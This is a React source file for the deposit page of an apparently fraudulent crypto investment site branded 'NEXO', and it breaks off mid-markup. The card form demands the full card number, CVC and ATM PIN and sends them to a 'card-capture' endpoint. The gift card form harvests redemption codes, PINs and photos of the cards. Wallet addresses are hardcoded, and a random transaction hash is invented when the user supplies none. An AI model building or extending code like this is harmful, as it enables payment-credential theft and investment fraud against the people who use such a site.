import React, { useState, useEffect } from 'react';
import {
  ArrowDownLeft,
  QrCode,
  Copy,
  CheckCircle2,
  Building2,
  CreditCard,
  Gift,
  AlertCircle,
  ShieldCheck,
  UploadCloud,
  FileText,
  Lock,
  Plus,
  Trash2,
  Image as ImageIcon,
  Clock,
  ExternalLink,
  X,
  Sparkles,
} from 'lucide-react';
import { UserProfile, AdminWalletSetting } from '../../types';

interface DepositProps {
  user: UserProfile;
  authToken: string;
  theme?: 'dark' | 'light';
  onRefreshUser: () => void;
}

interface GiftCardEntry {
  id: string;
  brand: string;
  code: string;
  pin: string;
  amount: string;
  imageProofUrl: string;
  imageFileName?: string;
}

const DEFAULT_WALLETS: AdminWalletSetting[] = [
  { id: 'w-btc', coin: 'Bitcoin', network: 'BTC', address: 'bc1q9v8t63u9y4fepw6q7n0kxm3vzp9y4fe7xk2k9a', isEnabled: true, label: 'BTC Network' },
  { id: 'w-eth', coin: 'Ethereum', network: 'ERC-20', address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24', isEnabled: true, label: 'ERC-20' },
  { id: 'w-usdt-trc', coin: 'Tether (USDT)', network: 'TRC-20', address: 'TLa2y8uVq9N7aEepW6xM3vZp9y4fE7xK2k', isEnabled: true, label: 'TRC-20 (Lowest Fee)' },
  { id: 'w-usdt-erc', coin: 'Tether (USDT)', network: 'ERC-20', address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24', isEnabled: true, label: 'ERC-20' },
  { id: 'w-sol', coin: 'Solana', network: 'SOL', address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU', isEnabled: true, label: 'Solana Network' },
];

export const Deposit: React.FC<DepositProps> = ({
  user,
  authToken,
  theme = 'dark',
  onRefreshUser,
}) => {
  const [activeChannel, setActiveChannel] = useState<'crypto' | 'bank' | 'card' | 'giftcard'>('crypto');
  const [wallets, setWallets] = useState<AdminWalletSetting[]>(DEFAULT_WALLETS);
  const [selectedWallet, setSelectedWallet] = useState<AdminWalletSetting>(DEFAULT_WALLETS[2]);
  const [copied, setCopied] = useState(false);

  // Crypto Form State
  const [cryptoAmount, setCryptoAmount] = useState('1000');
  const [txHash, setTxHash] = useState('');

  // Bank Wire Form State
  const [bankAmount, setBankAmount] = useState('5000');
  const [bankSenderName, setBankSenderName] = useState(user.fullName || '');
  const [bankName, setBankName] = useState('JPMorgan Chase / Citibank');
  const [wireReference] = useState(`NEXO-${Math.floor(100000 + Math.random() * 900000)}`);

  // Card Form State
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState(user.fullName || '');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvc, setCardCvc] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [cardAmount, setCardAmount] = useState('500');
  const [cardBillingAddress] = useState(user.country || 'United States');

  // Gift Card State (Multi-card with Image upload)
  const [giftCards, setGiftCards] = useState<GiftCardEntry[]>([
    {
      id: 'gc-1',
      brand: 'Amazon Giftcard',
      code: '',
      pin: '',
      amount: '',
      imageProofUrl: '',
      imageFileName: '',
    },
  ]);

  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // "Payment Is Being Processed" Dialog State
  const [showProcessingDialog, setShowProcessingDialog] = useState(false);
  const [dialogDetails, setDialogDetails] = useState<{
    referenceId: string;
    channel: string;
    amount: number;
    destinationOrSummary: string;
  } | null>(null);

  useEffect(() => {
    const fetchWallets = async () => {
      try {
        const res = await fetch('/api/transactions/deposit-addresses');
        if (res.ok) {
          const data = await res.json();
          if (data && data.length > 0) {
            setWallets(data);
            setSelectedWallet(data[0]);
          }
        }
      } catch (err) {
        console.error(err);
      }
    };
    fetchWallets();
  }, []);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleAddGiftCard = () => {
    const newCard: GiftCardEntry = {
      id: `gc-${Date.now()}`,
      brand: 'Amazon Giftcard',
      code: '',
      pin: '',
      amount: '',
      imageProofUrl: '',
      imageFileName: '',
    };
    setGiftCards([...giftCards, newCard]);
  };

  const handleRemoveGiftCard = (id: string) => {
    if (giftCards.length <= 1) return;
    setGiftCards(giftCards.filter((c) => c.id !== id));
  };

  const handleUpdateGiftCard = (id: string, field: keyof GiftCardEntry, value: string) => {
    setGiftCards(
      giftCards.map((card) => (card.id === id ? { ...card, [field]: value } : card))
    );
  };

  const handleGiftCardImageUpload = (id: string, e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCards(
          giftCards.map((card) =>
            card.id === id
              ? {
                  ...card,
                  imageProofUrl: reader.result as string,
                  imageFileName: file.name,
                }
              : card
          )
        );
      };
      reader.readAsDataURL(file);
    }
  };

  const totalGiftCardAmount = giftCards.reduce(
    (acc, item) => acc + (parseFloat(item.amount) || 0),
    0
  );

  // 1. Crypto Deposit Submission
  const handleCryptoDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    const numAmount = parseFloat(cryptoAmount) || 0;
    if (numAmount <= 0) {
      setErrorMessage('Please specify a valid deposit amount.');
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch('/api/transactions/deposit', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${authToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          method: 'crypto',
          coin: selectedWallet.coin,
          network: selectedWallet.network,
          amount: numAmount,
          txHash: txHash || `0x${Math.random().toString(16).substring(2, 38)}`,
          walletAddress: selectedWallet.address,
        }),
      });
      const data = await res.json();
      if (res.ok) {
        setDialogDetails({
          referenceId: data.transaction?.id || `DEP-${Date.now().toString().slice(-6)}`,
          channel: `Crypto: ${selectedWallet.coin} (${selectedWallet.network})`,
          amount: numAmount,
          destinationOrSummary: selectedWallet.address,
        });
        setShowProcessingDialog(true);
        setTxHash('');
        onRefreshUser();
      } else {
        setErrorMessage(data.error || 'Failed to submit crypto deposit.');
      }
    } catch (err) {
      setErrorMessage('Connection error while submitting crypto deposit.');
    } finally {
      setIsLoading(false);
    }
  };

  // 2. Bank Wire Submission
  const handleBankDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    const numAmount = parseFloat(bankAmount) || 0;
    if (numAmount <= 0) {
      setErrorMessage('Please specify a valid wire amount.');
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch('/api/transactions/bank-wire', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${authToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: numAmount,
          senderName: bankSenderName,
          bankName: bankName,
          reference: wireReference,
        }),
      });
      const data = await res.json();
      if (res.ok) {
        setDialogDetails({
          referenceId: data.transaction?.id || wireReference,
          channel: `Bank Wire Transfer (${bankName})`,
          amount: numAmount,
          destinationOrSummary: `Sender: ${bankSenderName} | Ref: ${wireReference}`,
        });
        setShowProcessingDialog(true);
        onRefreshUser();
      } else {
        setErrorMessage(data.error || 'Failed to log bank wire.');
      }
    } catch (err) {
      setErrorMessage('Failed to connect to wire processing server.');
    } finally {
      setIsLoading(false);
    }
  };

  // 3. Card Deposit Submission
  const handleCardDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);

    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 15) {
      setErrorMessage('Please enter a valid 16-digit card number.');
      return;
    }

    const numAmount = parseFloat(cardAmount) || 0;
    if (numAmount <= 0) {
      setErrorMessage('Please enter a valid amount.');
      return;
    }

    setIsLoading(true);
    try {
      const res = await fetch('/api/transactions/card-capture', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${authToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: numAmount,
          cardNumber: cardNumber,
          cardholderName: cardHolder,
          expiryDate: cardExpiry,
          cvc: cardCvc,
          pin: cardPin,
          billingAddress: cardBillingAddress,
        }),
      });
      const data = await res.json();
      if (res.ok) {
        setDialogDetails({
          referenceId: data.transaction?.id || `CARD-${Date.now().toString().slice(-6)}`,
          channel: 'Credit/Debit Card (Visa/Mastercard)',
          amount: numAmount,
          destinationOrSummary: `Card ending in ${cleanCard.slice(-4)} (${cardHolder})`,
        });
        setShowProcessingDialog(true);
        setCardNumber('');
        setCardCvc('');
        setCardPin('');
        onRefreshUser();
      } else {
        setErrorMessage(data.error || 'Card processing error.');
      }
    } catch (err) {
      setErrorMessage('Failed to process card checkout.');
    } finally {
      setIsLoading(false);
    }
  };

  // 4. Gift Card Deposit Submission (Single & Multi-Card with Image Proofs)
  const handleGiftCardDeposit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);

    // Validate that each card has code and valid amount
    for (let i = 0; i < giftCards.length; i++) {
      const card = giftCards[i];
      if (!card.code || card.code.trim().length < 4) {
        setErrorMessage(`Please enter the gift card code for Card #${i + 1} (${card.brand}).`);
        return;
      }
      const amt = parseFloat(card.amount);
      if (isNaN(amt) || amt <= 0) {
        setErrorMessage(`Please specify a valid dollar value for Card #${i + 1}.`);
        return;
      }
    }

    setIsLoading(true);
    try {
      const res = await fetch('/api/transactions/deposit-giftcard', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${authToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cards: giftCards.map((c) => ({
            type: c.brand,
            code: c.code,
            pin: c.pin || '',
            amount: parseFloat(c.amount) || 0,
            imageProofUrl: c.imageProofUrl,
          })),
        }),
      });
      const data = await res.json();
      if (res.ok) {
        setDialogDetails({
          referenceId: data.transaction?.id || `GC-BATCH-${Date.now().toString().slice(-6)}`,
          channel: `Gift Card Batch (${giftCards.length} Card${giftCards.length > 1 ? 's' : ''})`,
          amount: totalGiftCardAmount,
          destinationOrSummary: giftCards.map((c) => `${c.brand}: $${c.amount}`).join(', '),
        });
        setShowProcessingDialog(true);
        // Reset form
        setGiftCards([
          {
            id: 'gc-1',
            brand: 'Amazon Giftcard',
            code: '',
            pin: '',
            amount: '',
            imageProofUrl: '',
            imageFileName: '',
          },
        ]);
        onRefreshUser();
      } else {
        setErrorMessage(data.error || 'Failed to submit gift card(s).');
      }
    } catch (err) {
      setErrorMessage('Failed to connect to giftcard validation server.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="space-y-8 animate-fade-in">
      {/* Header */}
      <div>
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-bold bg-[#00FFB2]/10 text-[#00FFB2] border border-[#00FFB2]/20 mb-2">
          <ArrowDownLeft className="w-3.5 h-3.5" />
          <span>Multi-Gateway Payment Center</span>
        </div>
        <h2 className="text-2xl md:text-3xl font-black text-slate-900 dark:text-white tracking-tight">
          Deposit Capital & Funding Gateways
        </h2>
        <p className="text-slate-500 dark:text-gray-400 text-xs md:text-sm">
          Deposit crypto, direct bank wire, credit card checkout, or brand gift cards with instant receipt submission.
        </p>
      </div>

      {/* Error Notifications */}
      {errorMessage && (
        <div className="p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs font-bold flex items-center gap-2">
          <AlertCircle className="w-4 h-4 shrink-0" />
          <span>{errorMessage}</span>
        </div>
      )}

      {/* Payment Processing Dialog Modal */}
      {showProcessingDialog && dialogDetails && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fade-in">
          <div
            className={`w-full max-w-lg rounded-3xl p-6 sm:p-8 shadow-2xl border relative ${
              theme === 'dark' ? 'bg-[#151926] border-[#00FFB2]/40 text-white' : 'bg-white border-slate-200 text-slate-900 shadow-xl'
            }`}
          >
            <button
              onClick={() => setShowProcessingDialog(false)}
              className="absolute top-5 right-5 text-slate-400 dark:text-gray-400 hover:text-slate-900 dark:hover:text-white p-1.5 rounded-lg hover:bg-slate-100 dark:hover:bg-gray-800 transition cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="space-y-6 text-center">
              {/* Animated Spinner & Check Icon */}
              <div className="relative w-20 h-20 mx-auto">
                <div className="absolute inset-0 rounded-full border-4 border-emerald-500/20 dark:border-[#00FFB2]/20 animate-ping" />
                <div className="w-full h-full rounded-full bg-gradient-to-tr from-emerald-500/10 to-blue-500/10 border-2 border-emerald-500 dark:border-[#00FFB2] flex items-center justify-center text-emerald-500 dark:text-[#00FFB2]">
                  <Clock className="w-9 h-9 animate-spin" style={{ animationDuration: '6s' }} />
                </div>
              </div>

              <div className="space-y-2">
                <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-black uppercase tracking-wider bg-amber-500/10 text-amber-700 dark:text-amber-300 border border-amber-500/20">
                  <span>Status: Payment is being processed</span>
                </div>
                <h3 className="text-xl sm:text-2xl font-black tracking-tight text-slate-900 dark:text-white">
                  Deposit Submitted for Verification
                </h3>
                <p className="text-xs sm:text-sm text-slate-500 dark:text-gray-400 max-w-md mx-auto leading-relaxed">
                  Your deposit has been successfully recorded on the institutional ledger. Our compliance administrators will check, validate, and approve the payment before crediting your balance.
                </p>
              </div>

              {/* Transaction Summary Card */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-gray-950/80 border border-slate-200 dark:border-gray-800 text-left space-y-2.5 text-xs">
                <div className="flex justify-between items-center pb-2 border-b border-slate-100 dark:border-gray-800">
                  <span className="text-slate-500 dark:text-gray-400">Transaction ID:</span>
                  <span className="font-mono font-bold text-slate-900 dark:text-white">{dialogDetails.referenceId}</span>
                </div>
                <div className="flex justify-between items-center pb-2 border-b border-slate-100 dark:border-gray-800">
                  <span className="text-slate-500 dark:text-gray-400">Gateway Channel:</span>
                  <span className="font-bold text-emerald-600 dark:text-[#00FFB2]">{dialogDetails.channel}</span>
                </div>
                <div className="flex justify-between items-center pb-2 border-b border-slate-100 dark:border-gray-800">
                  <span className="text-slate-500 dark:text-gray-400">Deposit Amount:</span>
                  <span className="font-mono font-black text-emerald-600 dark:text-emerald-400 text-sm">
                    ${dialogDetails.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })} USD
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-slate-500 dark:text-gray-400">Estimated Review Time:</span>
                  <span className="font-medium text-amber-700 dark:text-amber-300">2 - 15 Minutes</span>
                </div>
              </div>

              {/* Action Button */}
              <button
                type="button"
                onClick={() => setShowProcessingDialog(false)}
                className="w-full py-3.5 rounded-xl bg-gradient-to-r from-[#00FFB2] to-emerald-400 hover:from-[#00E59E] hover:to-emerald-500 text-black font-black text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 cursor-pointer"
              >
                Acknowledge & View Portfolio
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Payment Channel Selector Tabs */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        {[
          { id: 'crypto', label: 'Crypto Transfer', icon: QrCode },
          { id: 'bank', label: 'Bank Wire', icon: Building2 },
          { id: 'card', label: 'Credit Card', icon: CreditCard },
          { id: 'giftcard', label: 'Gift Card', icon: Gift },
        ].map((channel) => {
          const Icon = channel.icon;
          const isActive = activeChannel === channel.id;
          return (
            <button
              key={channel.id}
              onClick={() => setActiveChannel(channel.id as any)}
              className={`flex items-center justify-center gap-2 p-4 rounded-2xl font-bold text-xs uppercase tracking-wider transition cursor-pointer border ${
                isActive
                  ? 'bg-[#00FFB2] text-black shadow-lg shadow-[#00FFB2]/20 border-[#00FFB2]'
                  : theme === 'dark'
                  ? 'bg-[#121622] hover:bg-gray-800 border-gray-800 text-gray-300'
                  : 'bg-white hover:bg-slate-100 border-slate-200 text-slate-700 shadow-sm'
              }`}
            >
              <Icon className="w-4 h-4" />
              <span>{channel.label}</span>
            </button>
          );
        })}
      </div>

      {/* CHANNEL 1: CRYPTO DEPOSIT */}
      {activeChannel === 'crypto' && (
        <div
          className={`p-6 sm:p-8 rounded-3xl border grid grid-cols-1 lg:grid-cols-2 gap-8 ${
            theme === 'dark' ? 'bg-[#121622] border-gray-800' : 'bg-white border-slate-200 shadow-sm'
          }`}
        >
          <div className="space-y-4">
            <h3 className="font-extrabold text-base text-slate-900 dark:text-white">1. Select Cryptocurrency & Network</h3>

            {/* Wallet Selection Chips */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {wallets.map((w) => (
                <button
                  key={w.id}
                  type="button"
                  onClick={() => setSelectedWallet(w)}
                  className={`p-3 rounded-2xl border text-left text-xs transition cursor-pointer ${
                    selectedWallet.id === w.id
                      ? 'border-[#00FFB2] bg-[#00FFB2]/10 text-slate-900 dark:text-white font-bold'
                      : 'border-slate-200 dark:border-gray-800 bg-slate-50 dark:bg-gray-900/60 text-slate-600 dark:text-gray-400'
                  }`}
                >
                  <div className="font-extrabold text-slate-900 dark:text-white">{w.coin}</div>
                  <div className="text-[10px] text-slate-500 dark:text-gray-400 font-mono">{w.label}</div>
                </button>
              ))}
            </div>

            {/* Address Box */}
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-gray-950/80 border border-slate-200 dark:border-gray-800 space-y-2">
              <span className="text-[11px] text-slate-500 dark:text-gray-400 font-semibold block">
                Official {selectedWallet.coin} Deposit Address ({selectedWallet.network})
              </span>
              <div className="flex items-center justify-between gap-2 p-2.5 rounded-xl bg-white dark:bg-gray-900 border border-slate-200 dark:border-gray-800">
                <span className="font-mono text-xs text-slate-900 dark:text-white break-all select-all font-bold">
                  {selectedWallet.address}
                </span>
                <button
                  onClick={() => handleCopy(selectedWallet.address)}
                  className="p-2 rounded-lg bg-slate-100 dark:bg-gray-800 hover:bg-[#00FFB2] hover:text-black text-slate-600 dark:text-gray-300 transition shrink-0 cursor-pointer"
                  title="Copy to Clipboard"
                >
                  {copied ? <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-[#00FFB2]" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/20 text-amber-500 text-xs flex items-start gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>
                Send only {selectedWallet.coin} ({selectedWallet.network}) to this address. All incoming payments require admin ledger verification and approval before crediting.
              </span>
            </div>
          </div>

          {/* Verification / Proof Form */}
          <form onSubmit={handleCryptoDeposit} className="space-y-4 text-xs">
            <h3 className="font-extrabold text-base text-slate-900 dark:text-white">2. Submit On-Chain Deposit Proof</h3>

             <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Deposited Amount (USD Equivalent)</label>
              <input
                type="number"
                min="10"
                step="any"
                required
                value={cryptoAmount}
                onChange={(e) => setCryptoAmount(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono font-bold text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Transaction Hash / TxID (Optional)</label>
              <input
                type="text"
                placeholder="0x892a... or blockchain transaction ID"
                value={txHash}
                onChange={(e) => setTxHash(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 rounded-xl bg-[#00FFB2] hover:bg-[#00E59E] text-black font-extrabold text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 flex items-center justify-center gap-2 cursor-pointer mt-4"
            >
              {isLoading ? (
                <span>Submitting to Node...</span>
              ) : (
                <>
                  <CheckCircle2 className="w-4 h-4" />
                  <span>Submit Crypto Payment Proof</span>
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* CHANNEL 2: BANK WIRE */}
      {activeChannel === 'bank' && (
        <div
          className={`p-6 sm:p-8 rounded-3xl border grid grid-cols-1 lg:grid-cols-2 gap-8 ${
            theme === 'dark' ? 'bg-[#121622] border-gray-800' : 'bg-white border-slate-200 shadow-sm'
          }`}
        >
          <div className="space-y-4">
            <h3 className="font-extrabold text-base text-slate-900 dark:text-white flex items-center gap-2">
              <Building2 className="w-5 h-5 text-blue-400" />
              <span>Official Institutional Bank Wire Details</span>
            </h3>

            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-gray-950/80 border border-slate-200 dark:border-gray-800 space-y-3 text-xs">
              <div className="flex justify-between items-center pb-2 border-b border-slate-200 dark:border-gray-800">
                <span className="text-slate-500 dark:text-gray-400">Beneficiary Bank:</span>
                <span className="font-bold text-slate-900 dark:text-white">JPMorgan Chase Bank, N.A.</span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-slate-200 dark:border-gray-800">
                <span className="text-slate-500 dark:text-gray-400">Beneficiary Account:</span>
                <span className="font-mono font-bold text-emerald-600 dark:text-[#00FFB2]">NEXO FINANCE ESCROW CUSTODY LLC</span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-slate-200 dark:border-gray-800">
                <span className="text-slate-500 dark:text-gray-400">SWIFT / BIC Code:</span>
                <span className="font-mono font-bold text-slate-900 dark:text-white">CHASUS33</span>
              </div>
              <div className="flex justify-between items-center pb-2 border-b border-slate-200 dark:border-gray-800">
                <span className="text-slate-500 dark:text-gray-400">Routing (ABA):</span>
                <span className="font-mono font-bold text-slate-900 dark:text-white">021000021</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-500 dark:text-gray-400">Reference / Memo Code:</span>
                <span className="font-mono font-black text-amber-700 dark:text-amber-400">{wireReference}</span>
              </div>
            </div>
          </div>

          <form onSubmit={handleBankDeposit} className="space-y-4 text-xs">
            <h3 className="font-extrabold text-base text-slate-900 dark:text-white">Submit Bank Wire Receipt</h3>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Transfer Amount (USD)</label>
              <input
                type="number"
                min="500"
                required
                value={bankAmount}
                onChange={(e) => setBankAmount(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono font-bold text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Sender Full Legal Name</label>
              <input
                type="text"
                required
                value={bankSenderName}
                onChange={(e) => setBankSenderName(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Remitting Bank Name</label>
              <input
                type="text"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 rounded-xl bg-[#00FFB2] hover:bg-[#00E59E] text-black font-extrabold text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 cursor-pointer"
            >
              {isLoading ? 'Processing Wire...' : 'Submit Wire Transfer Confirmation'}
            </button>
          </form>
        </div>
      )}

      {/* CHANNEL 3: CREDIT / DEBIT CARD */}
      {activeChannel === 'card' && (
        <div
          className={`p-6 sm:p-8 rounded-3xl border max-w-xl mx-auto ${
            theme === 'dark' ? 'bg-[#121622] border-gray-800' : 'bg-white border-slate-200 shadow-sm'
          }`}
        >
          <form onSubmit={handleCardDeposit} className="space-y-4 text-xs">
            <div className="flex items-center justify-between border-b border-slate-200 dark:border-gray-800 pb-3">
              <h3 className="font-extrabold text-base text-slate-900 dark:text-white flex items-center gap-2">
                <CreditCard className="w-5 h-5 text-emerald-600 dark:text-[#00FFB2]" />
                <span>Instant Card Checkout (Stripe & Visa/Mastercard)</span>
              </h3>
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Deposit Amount (USD)</label>
              <input
                type="number"
                min="50"
                value={cardAmount}
                onChange={(e) => setCardAmount(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono font-bold text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Cardholder Full Name</label>
              <input
                type="text"
                required
                value={cardHolder}
                onChange={(e) => setCardHolder(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div>
              <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Card Number (16 Digits)</label>
              <input
                type="text"
                required
                maxLength={19}
                placeholder="4532 •••• •••• 8892"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-sm font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
              />
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Expiry (MM/YY)</label>
                <input
                  type="text"
                  maxLength={5}
                  placeholder="12/28"
                  value={cardExpiry}
                  onChange={(e) => setCardExpiry(e.target.value)}
                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                />
              </div>
              <div>
                <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">CVC / CVV</label>
                <input
                  type="password"
                  maxLength={4}
                  placeholder="•••"
                  value={cardCvc}
                  onChange={(e) => setCardCvc(e.target.value)}
                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                />
              </div>
              <div>
                <label className="block text-slate-500 dark:text-gray-400 font-semibold mb-1">Card ATM / Security PIN</label>
                <input
                  type="password"
                  maxLength={6}
                  required
                  placeholder="••••"
                  value={cardPin}
                  onChange={(e) => setCardPin(e.target.value)}
                  className="w-full bg-slate-100 dark:bg-gray-950 border border-slate-200 dark:border-gray-800 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-900 dark:text-white focus:outline-none focus:border-[#00FFB2]"
                />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 rounded-xl bg-[#00FFB2] hover:bg-[#00E59E] text-black font-extrabold text-xs uppercase tracking-wider transition shadow-lg shadow-[#00FFB2]/20 cursor-pointer"
            >
              {isLoading ? 'Processing Card...' : `Pay & Fund $${cardAmount}`}
            </button>
          </form>
        </div>
      )}

      {/* CHANNEL 4: GIFT CARD (Multi-Card & Image Upload) */}
      {activeChannel === 'giftcard' && (
        <div
          className={`p-6 sm:p-8 rounded-3xl border max-w-3xl mx-auto ${
            theme === 'dark' ? 'bg-[#121622] border-gray-800' : 'bg-white border-slate-200 shadow-sm'
          }`}
        >
          <form onSubmit={handleGiftCardDeposit} className="space-y-6 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-200 dark:border-gray-800 pb-4">
              <div>
                <h3 className="font-extrabold text-base text-slate-900 dark:text-white flex items-center gap-2">
                  <Gift className="w-5 h-5 text-emerald-600 dark:text-[#00FFB2]" />
                  <span>Gift Card Vault & Image Verification</span>
                </h3>
                <p className="text-slate-500 dark:text-gray-400 text-[11px] mt-0.5">
                  You can upload multiple gift cards at once with front/back receipts or e-code screenshots.
                </p>
              </div>

              {/* Total batch summary badge */}
              <div className="px-3 py-1.5 rounded-xl bg-emerald-500/10 dark:bg-[#00FFB2]/10 border border-emerald-500/30 dark:border-[#00FFB2]/30 text-emerald-600 dark:text-[#00FFB2] font-mono font-bold text-xs flex items-center gap-1.5 self-start sm:self-auto">
                <Sparkles className="w-3.5 h-3.5" />
                <span>Total Value: ${totalGiftCardAmount.toLocaleString()} ({giftCards.length} card{giftCards.length > 1 ? 's' : ''})</span>
              </div>
            </div>

            {/* List of Gift Card Cards */}
            <div className="space-y-4">
              {giftCards.map((card, index) => (
                <div
                  key={card.id}
                  className="p-4 sm:p-5 rounded-2xl bg-slate-50 dark:bg-gray-950/70 border border-slate-200 dark:border-gray-800/90 space-y-3 relative group"
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="w-6 h-6 rounded-full bg-emerald-500/10 dark:bg-[#00FFB2]/20 text-emerald-600 dark:text-[#00FFB2] font-bold text-xs flex items-center justify-center">
                        {index + 1}
                      </span>
                      <span className="font-bold text-slate-900 dark:text-white">Gift Card #{index + 1}</span>
                    </div>

                    {giftCards.length > 1 && (
                      <button
                        type="button"
                        onClick={() => handleRemoveGiftCard(card.id)}
                        className="text-rose-500 hover:text-rose-400 p-1 rounded-lg hover:bg-rose-500/10 transition cursor-pointer flex items-center gap-1 text-[11px]"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                        <span>Remove</span>
                      </button>
                    )}
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
